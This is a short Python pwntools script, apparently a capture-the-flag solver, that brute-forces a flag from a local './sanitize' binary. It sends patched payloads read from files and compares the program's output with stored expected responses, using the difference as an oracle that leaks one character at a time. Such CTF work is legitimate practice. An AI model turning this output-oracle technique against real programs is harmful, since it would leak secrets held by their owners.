from __future__ import print_function
from pwn import *  
from time import *
context.log_level = 'error'
flag = 'flag{this_is_a_testing_flag_TESTING_0123456P)+_)!@#":}'
f = open('flag','w+')
f.write(flag)
f.close()
payloads = []
check = []
g = open('payload','r')
h = open('check','r')
for i in range(0x7f-0x20):
    s = g.read(14)
    payloads.append(s)
    s = h.read(657)
    check.append(s)

for i in range(5,0x7f):
    for j in range(0x20,0x7f):
        payload = payloads[j-0x20][0:8]+str(i)+payloads[j-0x20][9:]
        p = process('./sanitize')
        p.send(payload)
        s = p.recv()
        p.close()
        payload = payloads[j-0x20+1][0:8]+str(i)+payloads[j-0x20+1][9:]
        p = process('./sanitize')
        p.send(payload)
        r = p.recv()
        p.close()

        if s!= check[j-0x20] and r == check[j-0x20+1]:
            print(chr(j+1),end = '')
            break
